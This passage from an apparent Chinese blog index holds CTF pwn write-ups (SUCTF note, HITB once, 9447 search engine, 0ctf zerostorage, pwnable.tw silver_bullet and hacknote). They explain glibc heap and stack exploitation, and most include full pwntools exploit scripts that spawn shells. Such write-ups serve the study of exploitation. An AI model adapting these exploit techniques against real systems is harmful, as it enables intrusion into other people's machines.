&#123;89 fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;90 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;91 fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;92 &#125;93 pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;94 if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))95 &#123;96 if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */97 return EOF;98 else99 &#123;100 char *new_buf;101 char *old_buf = fp-&gt;_IO_buf_base;102 size_t old_blen = _IO_blen (fp);103 size_t new_size = 2 * old_blen + 100;104 if (new_size &lt; old_blen)105 return EOF; //这里有一个相对地址的调用，函数地址是fp的某地址，参数为new_size.106 new_buf107 = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);108 if (new_buf == NULL)109 &#123;110 /* __ferror(fp) = 1; */111 return EOF;112 &#125;113 if (old_buf)114 &#123;115 memcpy (new_buf, old_buf, old_blen);116 (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);117 /* Make sure _IO_setb won't try to delete _IO_buf_base. */118 fp-&gt;_IO_buf_base = NULL;119 &#125;120 memset (new_buf + old_blen, '\0', new_size - old_blen);121 122 _IO_setb (fp, new_buf, new_buf + new_size, 1);123 fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);124 fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);125 fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);126 fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);127 128 fp-&gt;_IO_write_base = new_buf;129 fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;130 &#125;131 &#125;132 133 if (!flush_only)134 *fp-&gt;_IO_write_ptr++ = (unsigned char) c;135 if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)136 fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;137 return c;138 &#125; 通过IDA查看libc，找到_IO_str_overflow，可以看到，a1是_IO_str_overflow的第一个参数，即fp；要执行的函数偏移为fp+224，参数为v7。可以考虑把fp+224写为system的地址，v7写为/bin/sh的地址；v6就等于(v7-100)/2，而v6又是*(fp+64)-v5，v5= *(fp+56)，这样我们可以自己构造一个_IO_FILE_plus结构，然后在64和56偏移处放入v6和v5，并把vtable的地址设置为_IO_str_jumps结构体的地址。 总结一下，在malloc_printerr中函数的调用关系如下： 举例分析–SUCTF2018 NOTE基本逻辑依旧是菜单类的小游戏，有三个功能：添加、展示和删除。 在游戏开始之前，先对ptr进行了初始化。ptr是位于bss段的一个指针数组，在ptr[0]中写入了：Hello,Welcome to SUCTF,I letf something here! add函数找到ptr中第一个为空的位置，分配size大小的空间，并输入内容，此处没有对输入内容的大小做限制。 show函数通过索引找到对应内存，输出内容。 dele函数会释放ptr[0]和qword_202078中存放地址对应的内存。 漏洞利用在add中，对输入的内容长度未做限制，会造成堆溢出漏洞。利用堆溢出漏洞，可以构造出上述的_IO_FILE_plus结构。 首先，泄露system地址，还是常用的UAF，当dele释放之后，通过读取unsortedbin的FD指针，计算出libc的地址。 然后，为了能够执行构造的_IO_FILE_plus结构中vtable的_IO_OVERFLOW，要对_IO_list_all进行劫持，即在_IO_flush_all_lockp函数中对_IO_list_all的每一个结点进行遍历时，要让它检查我们伪造的结点。因此考虑用unsorted bin attack，使解链操作时，*_IO_list_all = unsorted_chunk(av)，即第一个结点位于unsorted bin的头部，这样，chain对应的位置恰好为第六个small bins头的位置。我们可以想办法把伪造的_IO_FILE_plus放在第六个small bins对应的大小里，即0x60。 采用的方法是，通过缓冲区溢出修改下一个位于unsorted bin 的chunk大小为0x61，在这个chunk里存放伪造的_IO_FILE_plus。此时再分配一个大于0x60大小的内存，由于unsorted bin中的块不能满足要求，则会先将这个块放入对应大小的small bins里，然后再查找下一块。查找下一块时由于unsorted bin attack已经破坏了chunk的FD，由此就会触发malloc_printerr函数，遍历_IO_list_all，第一个结点已经转移unsorted bin上，但不满足条件，于是通过chain字段找到下一个结点，也就是我们伪造的结点，最终能够执行system。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677 from pwn import *#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;context.log_level='debug'debug=1if debug: p = process('./note') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,"b _IO_str_overflow")else : libc = ELF('./libc6_2.24-12ubuntu1_amd64.so') p = remote('pwn.suctf.asuri.org',20003)def add(size,content): p.recvuntil('Choice&gt;&gt;') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Content:') p.sendline(content)def show(index): p.recvuntil('Choice&gt;&gt;') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(): p.recvuntil('Choice&gt;&gt;') p.sendline('3') p.recvuntil('(yes:1)') p.sendline('1')add(16,'1'*16)#2#leak system addressdele()show(0)p.recvuntil('Content:')libc_addr = u64(p.recv(6)+'\x00\x00')offset = 0x7f1b15e2ab78-0x7f1b15a66000libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']sys_addr = libc_base+libc.symbols['system']malloc_hook = libc_base+libc.symbols['__malloc_hook']io_list_all = libc_base+libc.symbols['_IO_list_all']binsh_addr = libc_base+next(libc.search('/bin/sh'))+5log.info('sys_addr:%#x' %sys_addr)#unsorted bin attack fake_chunk = p64(0x8002)+p64(0x61) #headerfake_chunk += p64(0xddaa)+p64(io_list_all-0x10)#fake IO_FILE_PLUSfake_IFP = p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)fake_IFP = fake_IFP.ljust(0x80,'\x00')fake_IFP += p64(sys_addr+0x420)fake_IFP = fake_IFP.ljust(0xa0,'\x00')fake_IFP += p64(0)vtable_addr = malloc_hook-0x1370#+libc.symbols['_IO_str_jumps']fake_IFP += p64(0)fake_IFP += p64(0)fake_IFP += p64(vtable_addr)fake_IFP += p64(sys_addr)fake_IFP += p64(2)fake_IFP += p64(3) fake_IFP += p64(0)*3 payload = 'a'*16 +fake_chunk+fake_IFPpayload += p64(sys_addr)add(16,payload)#3#add a large chunkp.recvuntil('Choice&gt;&gt;')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x200))p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitbctf2018-once]]></title>
    <url>%2F2018%2F06%2F05%2Fhitbctf2018-once%2F</url>
    <content type="text"><![CDATA[once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的，果然要多读源码。 f2：在bss段有一个变量dword_202064，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。 f3：同样，bss有一个dword_202060变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。 f4：函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。 ​ 输入2时，向ptr内输入size大小的内容。 ​ 输入3时，释放ptr内存。 漏洞及利用在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称offset_202038为first,unk_202020为head： 123456//f2向结点内写内容，覆盖node[3]的地址为addr//first里记录的是node的地址first = *(first+3)//first = addr *(first+2)=&amp;head//*(addr+2)=&amp;head 可以看出，最终能够实现向addr+16的地址处写入head地址。由于f4后续可以操作ptr变量，就使得addr+16=&amp;ptr，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。 本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。addr = &amp;ptr-16 = 0x202058，发送最后一个字节0x58即可。 之后f4向ptr写入内容就相当于向unk_202020起始的位置写入内容。由于f2能够向off_202038中的地址写入内容，不妨将offset_202038的值写为 __free_hook的地址，之后调用f2就可以向这里写入system地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 __free_hook之后，再次调用free就会执行system，f4中的3调用了free函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为/bin/sh的地址。 一共要进行三次写操作： 1.f2向offset_202038中写入24字节填充和1字节0x58覆盖后向指针 2.f4-2向ptr中写入__free_hook地址、/bin/sh地址和对一些标识位置位。 3.f2向offset_202038（__free_hook）写入system地址 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *debug = 1elf = ELF('./once')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = process('./once') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('47.75.189.102', 9999) libc = ELF('./libc-2.23.so') context.log_level = 'debug'def fun_1(): p.recvuntil('&gt; ') p.sendline('1')def fun_2(string): p.recvuntil('&gt; ') p.sendline('2') p.sendline(string)def fun_3(): p.recvuntil('&gt; ') p.sendline('3')#leak libcp.recvuntil('&gt;')p.sendline('0')p.recvuntil('Invalid choice\n')libc.address = int(p.recvuntil('&gt;')[:-1],16)-libc.symbols['puts']#add a nodefun_1()#f4:ptr=malloc 0xe0p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('size:')p.sendline(str(0xe0))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')#input node fun_2('a'*16+'b'*8 + chr(0x58))#remove nodefun_3()#write ptrp.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send(p64(libc.symbols['system']))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('3')print '[*] system ',hex(libc.symbols['system'])p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastbin_attack-search]]></title>
    <url>%2F2018%2F06%2F05%2Ffastbin-attack-search%2F</url>
    <content type="text"><![CDATA[fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。 在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。 [TOC] fastbin劫持的原理fastbin劫持的原理是，在双重释放之后，fastbin上会有两个相同的chunk，当其中一个chunk被分配并能够进行写操作时，另一个留在fastbin链表里的chunk对应的内容也会发生改变，通过覆写FD指针，将链表中的下一个结点指向我们可以操控的地方。需要注意的是，fastbin再分配之前会先检查当前这个chunk的大小是否与申请的大小一致，因此伪造的fastbin chunk的size字段必须满足条件。 了解了原理之后再看search engine这道题。 search engine基本逻辑一个简单的搜索引擎，index a sentence输入一个句子，单词用空格作为分隔，每个单词放入一个结点中，记录单词的地址、大小以及所在句子的地址、大小，最后一个字段记录下一个结点的地址。单词链表类似于一个栈的结构，最后分隔的单词在链表的最顶端。一个node结点占40字节。 123456789struct node&#123; char * word; //8 bytes int word_size; //4 bytes int word_padding; //4 bytes char * sentence; //8 bytes int sentence_size; //4 bytes int sentence_padding;//4 bytes struct *next; //8 bytes&#125;; search with a word输入一个单词，从链表的头部开始查找相同单词，找到之后将对应的sentence置为0，并free sentence指针所指空间。 漏洞本题共有两个漏洞： 第二个漏洞我确实没看出来，大概是不细心&amp;平时我也是这么写的= = 释放sentence之后对应指针没有置零，UAF漏洞和double-free漏洞。 input_num函数可以泄露栈中的内容。strtol函数的第二个参数endptr返回的是字符串中不能转换为数字的地址，当输入的首个字符就不能转换为数字时，即&amp;nptr == endptr，input_num就会将输入的字符串打印出来。当输入的字符数量为48时，input_str不会向结尾加入NULL，由此可以读出字符串之后栈中的内容。 ​ 漏洞利用有了以上两个漏洞，再结合fastbin_dup_into_stack.c来看，我们需要泄露栈中地址，泄露libc地址（进而泄露system地址），将system函数写入栈中的返回地址处，执行system函数。 泄露栈地址（这个真的不是玄学吗？？） input_num函数是递归调用的，第一次输入48个字节后面没有其他东西，但是继续输入48个字节就有机会泄露栈中内容，即通过向上增长栈寻找可泄露的地址。 通过多次gdb的调试，发现泄露的内容是一个栈地址，但是我到现在还是不太明白，为什么这个栈地址加上某一偏移的地址其值能一直保持不变化。这里打一个问号。看别人的题解说，这里距离返回地址的位置比较近，可以确定的是，调用index sentence和 search word函数的返回地址都是0x400d60- 0x400e24范围内的，且压入返回地址的位置永恒不变，可以确定通过泄露的栈地址计算返回地址的栈地址，但是如何定位到含有“0x40”的地址，还没有搞清楚。 泄露libc地址 UAF漏洞可以达到这个目的。试想如果sentence（简称s1）的大小与一个node一样，都是40 bytes，那么当释放s1空间后，再输入一个新的sentence（简称s2，保证大小不是32-40字节，防止将刚释放的s1分配给它），这时会建立一个新的node（简称n2）存放word信息，就会将刚释放的s1的空间分配给n2，而且也能保证s1空间不再为NULL，绕过了对内容是否为空的检查：*（node + 16）！=NULL。 由于s1释放之后没有把指针置空，导致原来的node的word和sentence指针仍指向原来的位置，通过search并删除s1，使 n2 引用的是已释放的空间。 继续把已经释放的s1分配给新的sentence（简称s3），并通过向s3里写内容，伪造一个假的node结点，使其中sentence指针指向puts@got，这样在search成功之后，就会输出puts@got中的puts地址，从而泄露libc地址。 system函数覆盖栈中返回地址 按照其他大佬的思路，在泄露的栈地址之后找到了0x40用于表示chunk_size的地址，且距离返回地址较近，接下来就可以通过fastbin劫持将fastbin链表结点指向这个栈中地址。 为了配合0x40这个大小，可以新建两个0x40长度的sentence a和b，按照程序逻辑b对应的node结点将会在word链表的顶端。 然后通过search删除它们，fastbin中的结构如下: fastbin -&gt; a-&gt;b-&gt;NULL，由于node中的指针并没有置零，因此search的时候还会去检查已经释放的a和b空间是否符合条件。 search（’\x00’），先从word的顶端b对应的node开始检查，由于b中的FD指针为NULL，它不能通过（node + 16）！=NULL 的检测，接着来到a对应的node，即使node能够满足条件，但是*由于a是fastbin中的第一个chunk，释放它将会引发错误。因此我们可以在最开始时候新建3个sentence a,b,c。这样fastbin中就是：fastbin -&gt;a -&gt;b -&gt; c -&gt; NULL ，然后再search(‘\00’)，删除掉b保留a，达到双重释放的目的，fastbin结构变成：fastbin -&gt;b -&gt;a -&gt;b -&gt;…… 释放之后，再申请相同大小的sentence导致b空间被分配，并通过改写b从而改掉处于fastbin中b的FD指针，使其指向栈中假的chunk。 接着把剩余的a和b再分配出去，再申请sentence将会返回栈中的假chunk，以写sentence的内容覆写返回地址。 exp（栈中偏移地址部分参考了其他大佬的数据，整体思路也是顺着这位大佬来的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from pwn import *context(arch="amd64", os="linux")context.log_level = 'debug'p = process("./search")def leak_stack(): p.recvuntil("Quit\n") p.sendline("a"*48) p.recvline() p.sendline("b"*48) leak = p.recvline().split(' ')[0][48:] return int(leak[::-1].encode('hex'), 16)def index(sentence): #p.recvuntil("Quit\n") p.sendline("2") p.recvuntil("Enter the sentence size:\n") p.sendline(str(len(sentence))) p.recvuntil("Enter the sentence:\n") p.sendline(sentence)def search(word): p.recvuntil("Quit\n") p.sendline("1") p.recvuntil("Enter the word size:\n") p.sendline(str(len(word))) p.recvuntil("Enter the word:\n") p.sendline(word)def leak_libc(): sentence = 'a'*12 + ' b ' sentence = sentence.ljust(40,'c') index(sentence) #delete s1 search('b') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') #n4 use s1 index('d'*64) #delete s1,but n4 still can use it=&gt;UAF search('\x00') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') #a new sentence share space with n4 puts_got = 0x602028 node =p64(0x400E90) #"Enter" node += p64(5) node += p64(puts_got) node += p64(64) index(node) #search 'Enter' to leak puts_address search('Enter') p.recvuntil("Found 64: ") puts_addr = u64(p.recv(8)) print "###puts_addr:0x%x" %puts_addr p.recvuntil("Delete this sentence (y/n)?") p.sendline('n') return puts_addrdef overwrite_retn(): index('a'*54+' d') index('b'*54+' d') index('c'*54+' d') # a-&gt;b-&gt;c-&gt;NULL search('d') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') # b-&gt;a-&gt;b-&gt;c-&gt;NULL search('\x00') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('n') # fake fastbin index(p64(stack_addr).ljust(56,'e')) # malloc a and b index('f'*56) index('g'*56) # overwrite the ret address with gadget pop_ret = 0x400e23 sentence = 'A'*30 sentence += p64(pop_ret) sentence += p64(binsh_addr) sentence += p64(system_addr) index(sentence) #leak stack addressstack_leak = leak_stack()stack_addr = stack_leak + 0x22 - 8#leak libc addressputs_addr = leak_libc()libc = ELF('libc.so')system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])binsh_addr = puts_addr - (libc.symbols['puts']-next(libc.search('/bin/sh')))#double free to edit the retn address in stackoverwrite_retn()p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unsortedbin_attack--0ctf zerostorage]]></title>
    <url>%2F2018%2F03%2F13%2Funsortedbin-attack-0ctf-zerostorage%2F</url>
    <content type="text"><![CDATA[unsortedbin attack代码中存在UAF漏洞时，可以通过操纵unsorted bin 的BK指针时，使其修改某一变量的值。举一个简单的例子: shellphish/how2heap/unsorted_bin_attack 一个unsorted bin，称为victim，victim具有UAF漏洞，则在释放后操作victim时，可以修改victim-&gt;bk为需要修改的变量var的地址-0x10，即&amp;var-0x10，这样在再次将victim分配时，会进行unlink操作，将var的值修改为unsorted bin头的地址： 123bck = victim-&gt;bk; //bck = &amp;var-0x10unsorted_chunk(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunk(av) //*(&amp;var-0x10+0x10) = unsorted_chunk(av) =&gt; var = unsorted_chunk(av) 典型的应用是修改global_max_fast，这个全局变量代表着fastbin 中能够放入的最大chunk的大小，通过修改这个值可以让所有的chunk释放之后都挂在fastbin上，由于fastbin的结构简单，是单链结构，进而进行fastbin攻击。 实例：0ctf zerostorage基本逻辑典型的对堆进行操作的题： insert函数中可以看出，有一个全局数组entries，应该是一个结构体数组，每一个结构体占24个字节，前四个字节记录是否使用中，接着四个字节的padding，然后是8字节的长度和8字节的内容地址信息，这里地址信息不是直接记录的，而是通过与/dev/urandom中的数字异或后存放的。 content内容地址的分配内存是分三种情况：x&lt; 128 直接分配大小为128；128&lt;=x&lt;=4096 分配大小为x；x&gt;4096只分配4096大小。 update函数用于重新编辑content，必要时重新分配内存，修改length和content addr。 merge函数合并两个entry对应的content，释放第一个entry的content，将第一个entry各项置零，并重新找到一个entry，把合并后的content地址赋给新的entry 的 content addr。 delete函数释放entry的content addr 所指的内存，并将指针置零，entry中的各项也置零，很安全，是free的正确使用方法。 view函数查看内容 漏洞虽然本题的delete函数非常安全，但是在merge函数中，如果输入的两个编号一样，将会先free 然后又把指针给另一个entry，即UAF。 漏洞利用本题开了所有保护，关键是PIE 本题还提到一条，之后会用到： 1Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel. libc地址泄露： 第一个释放的chunk（不是fastbin），其FD和BK指针都指向main_arena中bins结构中的unsorted bin头，main_arena中的各个值存放于libc中的bss段，因此，可以在merge 之后读取这一块的前八个字节，正好是libc中的地址，通过偏移可以计算出libc的基址。 由于本题开了PIE，因此不能直接获取程序中指令的地址，但是在 Notice中提到的【Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel】的操作系统存在着offsetlibc的漏洞，也就是说可以从libc的基址推断出程序的基址。 unsorted bin attack修改global_max_fast的值： update上一步提到的块，将BK修改为&amp;global_max_fast -0x10，FD修改为一个较大的值。再insert一个新的entry时，会将这个块从unsorted bin上unlink后分给新 entry的content，由此完成了对global_max_fast值的改写，接下来的所有块都将属于fastbin的范围。 fastbin劫持用于读取random的值： 再merge另外两个相同的块，此时释放的块将挂在fastbin上，设某一已经分配的entry的index为idx1，利用UAF修改该fastbin的FD指针为entries[idx1]，且保证entries[idx1]和merge的块在fastbin中的大小相同，如均为144，因为fastbin在分配时候会首先检查chunk的size字段是否为当前链中应该的大小。 之后再insert两次，第一次将merge的块从fastbin中摘除，此时fastbin的头就指向了entries[idx1]，第二次insert就把entries[idx1]分给了新的entry 称为 entries[idx3]，即entries[idx3]的content addr指向entries[idx1]。由于entries[idx3] + 0x16中记载的是entries[idx1]^random，通过update idx3将这个值读出后异或entries[idx1]，由此得到random的值 这次的shell的执行没有用system，学到了一个新的知识： one_gadget 再次update idx3，修改idx1下一个entry idx2的content addr处为 free_hook^ random，这样再update idx2时，相当于修改free_hook的值，将其写为one_gadget的地址。 exp由于目前手中没有Ubuntu 14.xx的系统，在此只记录思路，之后再做具体复现，exp可以参考 Hanquing Zhao 思路： 用#0，#1，…代表entries[0]，entries[1]；&amp;0，&amp;1，….代表堆上分配的各个content编号 123456789101112131415161718192021222324insert #0 -&gt; &amp;0insert #1 -&gt; &amp;1insert #2 -&gt; &amp;2merge #1,#1 =&gt; #3-&gt;&amp;1(已free)view #3 =&gt;读FD 泄露libc地址，进而获取one_gadget地址、entries地址和free_hook地址update #3 =&gt;覆写global_max_fast的值，之后所有chunk都属于fastbininsert #1 -&gt; &amp;1insert #4 -&gt; &amp;3insert #5 -&gt; &amp;4merge #4,#4 =&gt; #6-&gt;&amp;3(已free)update #6 =&gt;FD的值写成#5（entries[5]）的地址insert #7-&gt;&amp;3insert #8-&gt;#5 view #8 =&gt;获取random的值update #8 =&gt;覆写#6的各个字段，重点是将content_addr写为random^free_hookupdate #6 =&gt;在free_hook中写入one_gadget地址delete #0 =&gt;调用free_hook即one_gadget]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw-silver_bullet]]></title>
    <url>%2F2018%2F03%2F08%2Fpwnable-tw-silver-bullet%2F</url>
    <content type="text"><![CDATA[silver_bullet基本逻辑依旧是菜单类型的小游戏： 这道题就是create一个silver bullet（简称sb），输入的字符串长度就是sb的能量，power up会用strncat连接上新输入的字符串，仍旧是长度是能量，然后能量达到一定值时beat ，然后返回。 漏洞power_up函数中，用到了strncat，而该函数会在末尾主动加入\0。这个操作有机会覆盖s[48]，即记录字符串长度的最低位。 漏洞利用考虑到power_up只在s[48]&lt;=47时起作用，可以分两次操作：先create一个47长度的sb，然后power_up 1，通过strncat，\0就会覆盖s[48]，再计算长度时就为0+1=1 这样就可以继续再写47个字符了，并且是从s[48]之后开始写。 继续写的字符可以伪造ROP，当然为了返回，应该首先执行beat函数，将s[48]的之后三位写成FF FF FF，这样当以int类型读取字符串大小时（即从s[48]开始，长度为4的int），大小为FFFFFF01，就可以利用beat成功返回了。 system函数地址泄露：通过puts输出函数地址，从而泄露system的地址。因为可以继续写47个字符，将有机会覆写main的返回地址。将main的返回地址写为puts@plt，并在此处构造ROP结构，称为ROP1，puts函数的参数为puts@got，即读出puts的实际地址，进而泄露system地址。由于ROP1中不能继续构造新的ROP，因此将返回地址位置写为一个gadget。 system函数调用： 1）写入system函数–read_input：上一步只是泄露了system的地址，并未写入到栈结构中，因此需要另一次机会将system地址写入，程序中提供的read_input函数正好可以实现这个功能。这就要求从puts函数返回之后应该继续执行read_input函数，找到一个pop|retn 的gadget作为ROP1 的返回地址，执行时先pop出puts@got，再返回read_input。 接着构造一个read_input函数的ROP结构，称为ROP2。由于栈溢出只能再写47个字节，再写一个system的ROP结构不够用，因此考虑在另一块空间继续写入system的ROP结构。这个空间可以选在BSS段之后的地址，起名为fake_addr。read_input的第一个参数为fake_addr，第二个参数为大小，返回地址争取直接跳到fake_addr处。 在覆写main函数返回地址时将ebp覆写为fake_addr，之后保证ebp不变，在ROP2的返回地址处写入leave|retn的gadget使得 leave时 esp = ebp = fake_addr，pop ebp，然后返回执行system函数。 2）system函数的ROP：先是一个随意的值用于pop ebp，接着写入system地址和参数。 整体的栈结构如下： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level='debug'debug = 0if debug: p = process('./silver_bullet') libc = ELF('./libc.so')else: p = remote('chall.pwnable.tw',10103) libc = ELF('./libc_32.so.6')d = 0#gdb.attach(p,'b*0x80485eb')# create size:47p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Give me your description of bullet :')payload1 ='a' * 47p.send(payload1)# overflow size:1p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Give me your another description of bullet :')payload2 ='b'p.send(payload2)#overwrite stackp.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Give me your another description of bullet :')puts_plt = 0x80484a8puts_got = 0x804afdcfake_addr = 0x804b410pr_addr = 0x08048475lr_addr = 0x8048a18read_input = 0x80485ebpayload3 = '\xff' * 3 + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(0x1011)p.send(payload3)#beat and execute p.recvuntil('Your choice :')if d: gdb.attach(p)p.sendline('3')p.recvuntil('Oh ! You win !!\n')puts_addr = u32(p.recv(4))system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])print 'puts_addr: 0x%x' %puts_addr#read_input contentpayload = p32(fake_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(fake_addr + 0x10) + '/bin/sh'p.send(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw--hacknote]]></title>
    <url>%2F2018%2F03%2F08%2Fpwnable-tw-hacknote%2F</url>
    <content type="text"><![CDATA[hacknote基本逻辑这又是一道malloc相关的内存题目，但是不是老套路。三个函数：add_note，delete_note和print_note。 使用add_note分配的地址用一个堆表（自己起的名字）存放，（其实就是一个存放地址的数组）。通过add_note可以看出分配的每个块是什么结构： 首先在ptr[i]中存放一个8字节大小的block（实际malloc分配了16字节）地址；然后这个地址中（称为note块）前4个字节是一个函数地址，即输出地址+4中的内容： 另外四个字节存放一个新分配的content块的地址，大小size由用户进行输入。对于一个初始状态的地址空间，add_note后的结构如下： delete_note就是先释放content地址这块空间，再释放malloc（8）这块空间。 print_note就是调用note块的第一个字段即puts函数 漏洞deltenote将note和content释放之后并没有将ptr[i]置为空，也就是说，虽然指针所指向的内存释放掉了，但实际内容还在，我们仍然能使用，即UAF。 漏洞利用本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。 system函数地址泄露：print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。 system函数调用：同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 这里涉及一个知识点：Linux连续执行多条命令http://blog.csdn.net/freedom2028/article/details/7104131 仔细看print_note，最终调用函数时，参数也是同一个地址： 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\0’. exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level='debug'def add_note(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Note size :') p.sendline(str(size)) p.recvuntil('Content :') p.send(content)def delete_note(index): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index))def print_note(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))debug = 0 if debug: p = process('./hacknote') libc = ELF('./libc.so')else: p = remote('chall.pwnable.tw', 10102) libc = ELF('./libc_32.so.6')add_note(128,'aaaa')add_note(128,'bbbb')delete_note(1)delete_note(0)payload = p32(0x804862b)+p32(0x804A018)add_note(8,payload)print_note(1)free_addr = u32(p.recv(4))print "free_addr:%x" %free_addroffset = libc.symbols['system'] - libc.symbols['free']system_addr = free_addr + offsetdelete_note(2)payload = p32(system_addr) + ';sh\0'add_note(8,payload)print_note(1)if debug: gdb.attach(p)print "offset:%x,system_addr: %x" %(offset,system_addr)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCTF PWN]]></title>
    <url>%2F2018%2F02%2F07%2FHITCTF-PWN%2F</url>
